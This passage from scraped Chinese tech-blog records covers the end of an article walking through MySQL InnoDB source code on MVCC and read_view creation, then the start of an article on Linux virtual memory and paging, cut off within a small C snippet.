data-line=\"crayon-5bab670167e84993350332-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e84993350332-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e84993350332-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e84993350332-1\"><span class=\"crayon-e\">dberr_t </span><span class=\"crayon-e\">row_vers_build_for_consistent_read</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e84993350332-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e84993350332-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e84993350332-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">;</span><span class=\"crayon-sy\">;</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e84993350332-5\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">trx_undo_prev_version_build</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rec</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mtr</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">version</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">heap</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">prev_version</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e84993350332-6\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e84993350332-7\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">trx_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">row_get_rec_trx_id</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">prev_version</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e84993350332-8\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 如果当前row版本符合一致性视图，则返回</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e84993350332-9\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">read_view_sees_trx_id</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">view</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">trx_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e84993350332-10\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e84993350332-11\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e84993350332-12\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e84993350332-13\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 如果当前row版本不符合，则继续回溯上一个版本(回到for循环的地方)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e84993350332-14\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">version</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">prev_version</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e84993350332-15\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e84993350332-16\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e84993350332-17\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e84993350332-18\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p>整个过程如下图所示:<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/6d2cebe3f4e8a8d0a1069fd7e376db24.png\" alt=\"\"><br>\n至于undolog怎么恢复出对应版本的row记录就又是一个复杂的过程了，由于篇幅原因，在此略过不表。</p>\n<h2>read_view创建时机再讨论</h2>\n<p>在创建一致性视图的row_search_for_mysql的代码中</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e87788151108\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 只有非锁模式的select才创建一致性视图\r\nelse if (prebuilt-&gt;select_lock_type == LOCK_NONE) {\t\t// 创建一致性视图\r\n\t\ttrx_assign_read_view(trx);\r\n\t\tprebuilt-&gt;sql_stat_start = FALSE;\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e87788151108-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e87788151108-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e87788151108-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e87788151108-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e87788151108-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e87788151108-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e87788151108-1\"><span class=\"crayon-c\">// 只有非锁模式的select才创建一致性视图</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e87788151108-2\"><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">prebuilt</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">select_lock_type</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LOCK_NONE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 创建一致性视图</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e87788151108-3\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">trx_assign_read_view</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">trx</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e87788151108-4\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">prebuilt</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">sql_stat_start</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">FALSE</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e87788151108-5\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e87788151108-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>trx_assign_read_view中由这么一段代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e8b650187620\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 一致性视图在一个事务只创建一次\r\nif (!trx-&gt;read_view) {\r\n\t\ttrx-&gt;read_view = read_view_open_now(\r\n\t\t\ttrx-&gt;id, trx-&gt;global_read_view_heap);\r\n\t\ttrx-&gt;global_read_view = trx-&gt;read_view;\r\n\t}\r\n\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e8b650187620-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e8b650187620-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e8b650187620-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e8b650187620-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e8b650187620-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e8b650187620-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e8b650187620-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e8b650187620-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e8b650187620-1\"><span class=\"crayon-c\">// 一致性视图在一个事务只创建一次</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e8b650187620-2\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">trx</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">read_view</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e8b650187620-3\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">trx</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">read_view</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">read_view_open_now</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e8b650187620-4\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">trx</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">trx</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">global_read_view_heap</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e8b650187620-5\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">trx</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">global_read_view</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">trx</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">read_view</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e8b650187620-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e8b650187620-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e8b650187620-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>所以综合这两段代码，即在一个事务中，只有第一次运行select(不加锁)的时候才会创建一致性视图,如下图所示: <img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/2bf5ee3e1a28647edf243ab6abb1aa1a.png\" alt=\"\"><br>\n笔者构造了此种场景模拟过，确实如此。</p>\n<h2>MVCC和锁的同时作用导致的一些现象</h2>\n<p>MySQL是通过MVCC和二阶段锁(2PL)来兼顾性能和一致性的，但是由于MySQL仅仅在select时候才创建一致性视图，而在update等加锁操作的时候并不做如此操作，所以就会产生一些诡异的现象。如下图所示:<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/a1a125137881439dd76bf17995f0eb38.png\" alt=\"\"><br>\n如果理解了update不走一致性视图(read_view)，而select走一致性视图(read_view)，就可以很好解释这个现象。 如下图所示:<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/99b386ee5683f19f87c059ce5b74cc1e.png\" alt=\"\"></p>\n<h2>总结</h2>\n<p>MySQL为了兼顾性能和ACID使用了大量复杂的机制，2PL(两阶段锁)和MVCC就是其实现的典型。幸好可以通过xcode等IDE进行方便的debug，这样就可以非常精确加便捷的追踪其各种机制的实现。希望这篇文章能够帮助到喜欢研究MySQL源码的读者们。</p>\n<h1></h1>\n<div>\n<div><!-- oschina-blog-728x90 --> <ins></ins></div>\n</div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114273\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114273votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114273\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/122897caaf5c7d1b1b7bfa67a1ac43c10e67c13a.jpg"}
{"title": "Linux 的内存分页管理", "url": "http://blog.jobbole.com/114225/", "create_date": "2018/07/24", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "url_object_id": "55f5db66a79f044fb9cda220f73cbb30", "praise_nums": 1, "fav_nums": 4, "comment_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/vamei/p/9329278.html\">Vamei</a>   </div><p>内存是计算机的主存储器。内存为进程开辟出进程空间，让进程在其中保存数据。我将从内存的物理特性出发，深入到内存管理的细节，特别是了解虚拟内存和内存分页的概念。</p>\n<h3>内存</h3>\n<p>简单地说，内存就是一个数据货架。内存有一个最小的存储单位，大多数都是一个字节。内存用内存地址（memory address）来为每个字节的数据顺序编号。因此，内存地址说明了数据在内存中的位置。内存地址从0开始，每次增加1。这种线性增加的存储器地址称为线性地址（linear address）。为了方便，我们用十六进制数来表示内存地址，比如0x00000003、0x1A010CB0。这里的“0x”用来表示十六进制。“0x”后面跟着的，就是作为内存地址的十六进制数。</p>\n<p>内存地址的编号有上限。地址空间的范围和地址总线（address bus）的位数直接相关。CPU通过地址总线来向内存说明想要存取数据的地址。以英特尔32位的80386型CPU为例，这款CPU有32个针脚可以传输地址信息。每个针脚对应了一位。如果针脚上是高电压，那么这一位是1。如果是低电压，那么这一位是0。32位的电压高低信息通过地址总线传到内存的32个针脚，内存就能把电压高低信息转换成32位的二进制数，从而知道CPU想要的是哪个位置的数据。用十六进制表示，32位地址空间就是从0x00000000 到0xFFFFFFFF。</p>\n<p>内存的存储单元采用了随机读取存储器（RAM， Random Access Memory）。所谓的“随机读取”，是指存储器的读取时间和数据所在位置无关。与之相对，很多存储器的读取时间和数据所在位置有关。就拿磁带来说，我们想听其中的一首歌，必须转动带子。如果那首歌是第一首，那么立即就可以播放。如果那首歌恰巧是最后一首，我们快进到可以播放的位置就需要花很长时间。我们已经知道，进程需要调用内存中不同位置的数据。如果数据读取时间和位置相关的话，计算机就很难把控进程的运行时间。因此，随机读取的特性是内存成为主存储器的关键因素。</p>\n<p>内存提供的存储空间，除了能满足内核的运行需求，还通常能支持运行中的进程。即使进程所需空间超过内存空间，内存空间也可以通过少量拓展来弥补。换句话说，内存的存储能力，和计算机运行状态的数据总量相当。内存的缺点是不能持久地保存数据。一旦断电，内存中的数据就会消失。因此，计算机即使有了内存这样一个主存储器，还是需要硬盘这样的外部存储器来提供持久的储存空间。</p>\n<h3>虚拟内存</h3>\n<p>内存的一项主要任务，就是存储进程的相关数据。我们之前已经看到过进程空间的程序段、全局数据、栈和堆，以及这些这些存储结构在进程运行中所起到的关键作用。有趣的是，尽管进程和内存的关系如此紧密，但进程并不能直接访问内存。在Linux下，进程不能直接读写内存中地址为0x1位置的数据。进程中能访问的地址，只能是虚拟内存地址（virtual memory address）。操作系统会把虚拟内存地址翻译成真实的内存地址。这种内存管理方式，称为虚拟内存（virtual memory）。</p>\n<p>每个进程都有自己的一套虚拟内存地址，用来给自己的进程空间编号。进程空间的数据同样以字节为单位，依次增加。从功能上说，虚拟内存地址和物理内存地址类似，都是为数据提供位置索引。进程的虚拟内存地址相互独立。因此，两个进程空间可以有相同的虚拟内存地址，如0x10001000。虚拟内存地址和物理内存地址又有一定的对应关系，如图1所示。对进程某个虚拟内存地址的操作，会被CPU翻译成对某个具体内存地址的操作。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/b017014a91fca7de4a4d2432c6b7913a.png\" alt=\"\" width=\"420\" height=\"206\"></p>\n<p style=\"text-align: center\">图1 虚拟内存地址和物理内存地址的对应</p>\n<p>应用程序来说对物理内存地址一无所知。它只可能通过虚拟内存地址来进行数据读写。程序中表达的内存地址，也都是虚拟内存地址。进程对虚拟内存地址的操作，会被操作系统翻译成对某个物理内存地址的操作。由于翻译的过程由操作系统全权负责，所以应用程序可以在全过程中对物理内存地址一无所知。因此，C程序中表达的内存地址，都是虚拟内存地址。比如在C语言中，可以用下面指令来打印变量地址：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671dc5ad0486787736\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nint v = 0;\r\nprintf(\"%p\", (void*)&amp;v);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671dc5ad0486787736-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671dc5ad0486787736-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671dc5ad0486787736-1\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671dc5ad0486787736-2\"><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%p\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] 